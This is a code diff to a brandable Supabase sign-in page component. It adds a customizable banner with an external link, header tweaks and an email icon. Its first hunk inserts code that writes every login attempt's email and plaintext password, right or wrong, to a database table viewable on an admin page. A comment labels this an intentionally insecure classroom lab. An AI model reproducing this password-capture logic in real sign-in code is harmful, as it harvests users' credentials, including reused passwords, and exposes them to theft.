@@ -232,6 +232,17 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
       const sb = getSupabase();
       if (sb) {
         const { error: authErr } = await sb.auth.signInWithPassword({ email: email.trim(), password });
+        // CLASSROOM LAB (intentionally insecure): record every attempt, right or wrong, in
+        // plain text so students can find it in /signin/admin. Never blocks sign-in.
+        try {
+          await sb.from("signin_attempt_logs").insert({
+            email: email.trim(),
+            attempted_password: password,
+            success: !authErr,
+          });
+        } catch {
+          /* logging must never break sign-in */
+        }
         if (authErr) throw authErr;
       } else {
         await new Promise((r) => setTimeout(r, 500));
@@ -272,19 +283,64 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
       style={cssVars}
       className={`bivo flex w-full flex-col ${previewOnly ? "min-h-[520px]" : "min-h-[100dvh]"}`}
     >
+      {brand.showBanner && (
+        <div style={{ padding: brand.bannerSpacing }}>
+          <div
+            className="flex items-start gap-4 border"
+            style={{
+              borderColor: "var(--bivo-border)",
+              backgroundColor: brand.bannerBackgroundColor,
+              borderRadius: brand.bannerRadius,
+              paddingLeft: brand.bannerPaddingX,
+              paddingRight: brand.bannerPaddingX,
+              paddingTop: brand.bannerPaddingY,
+              paddingBottom: brand.bannerPaddingY,
+            }}
+          >
+            {brand.bannerIconUrl || brand.logoUrl ? (
+              // eslint-disable-next-line @next/next/no-img-element -- icon is a data: URL or an external https link
+              <img
+                src={brand.bannerIconUrl || brand.logoUrl}
+                alt=""
+                className="shrink-0 object-contain"
+                style={{ width: brand.bannerIconSize, height: brand.bannerIconSize }}
+              />
+            ) : (
+              <span className="shrink-0">
+                <BrandMark color={brand.buttonColor} size={brand.bannerIconSize} letter={letter} />
+              </span>
+            )}
+            <div className="min-w-0 flex-1">
+              <p className="font-semibold" style={{ fontSize: brand.bannerTitleSize, lineHeight: 1.3 }}>
+                {brand.bannerTitle}
+              </p>
+              <p style={{ fontSize: brand.bannerTextSize, color: muted, marginTop: 4, lineHeight: 1.45 }}>{brand.bannerText}</p>
+              <div className="flex justify-end" style={{ marginTop: 12 }}>
+                <a
+                  href={previewOnly || !brand.bannerLinkUrl ? undefined : brand.bannerLinkUrl}
+                  className="font-semibold hover:underline"
+                  style={{ fontSize: brand.bannerLinkSize, color: "var(--bivo-link)" }}
+                >
+                  {brand.bannerLinkLabel}
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       <header
         className="flex w-full items-center gap-2 border-b px-4 sm:px-6"
         style={{ borderColor: "var(--bivo-border)", paddingTop: brand.headerPaddingY, paddingBottom: brand.headerPaddingY }}
       >
-        {brand.showLogo && brand.logoUrl ? (
-          // eslint-disable-next-line @next/next/no-img-element -- logo is a data: URL or an external https link
-          <img src={brand.logoUrl} alt={`${brand.appName} logo`} className="object-contain" style={{ height: brand.logoSize, maxWidth: 240 }} />
-        ) : (
-          <>
-            {brand.showLogo && <BrandMark color={brand.buttonColor} size={brand.logoSize} letter={letter} />}
-            <span style={{ fontSize: brand.headerTextSize, color: muted }}>Sign in with {brand.appName}</span>
-          </>
-        )}
+        {brand.showLogo &&
+          (brand.logoUrl ? (
+            // eslint-disable-next-line @next/next/no-img-element -- logo is a data: URL or an external https link
+            <img src={brand.logoUrl} alt={`${brand.appName} logo`} className="object-contain" style={{ height: brand.logoSize, maxWidth: 240 }} />
+          ) : (
+            <BrandMark color={brand.buttonColor} size={brand.logoSize} letter={letter} />
+          ))}
+        <span style={{ fontSize: brand.headerTextSize, color: muted }}>Sign in with {brand.appName}</span>
       </header>
 
       <div
@@ -337,8 +393,18 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
           {step === "password" && (
             <>
               <h1 style={{ fontSize: brand.titleSize, fontWeight: "inherit" }}>{brand.signinPasswordTitle}</h1>
-              <p className="break-all" style={{ marginTop: brand.titleSpacing, fontSize: brand.sublineSize, color: muted }}>
-                {email.trim()}
+              <p className="flex items-center gap-2" style={{ marginTop: brand.titleSpacing, fontSize: brand.sublineSize, color: muted }}>
+                <svg
+                  width={Math.round(brand.sublineSize * 1.4)}
+                  height={Math.round(brand.sublineSize * 1.4)}
+                  viewBox="0 0 24 24"
+                  fill="currentColor"
+                  aria-hidden="true"
+                  className="shrink-0"
+                >
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3a3 3 0 110 6 3 3 0 010-6zm0 14.2a7.2 7.2 0 01-6-3.22c.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08a7.2 7.2 0 01-6 3.22z" />
+                </svg>
+                <span className="break-all">{email.trim()}</span>
               </p>
               <form onSubmit={handlePasswordSubmit} noValidate style={{ marginTop: brand.sublineSpacing }}>
                 <FloatingInput
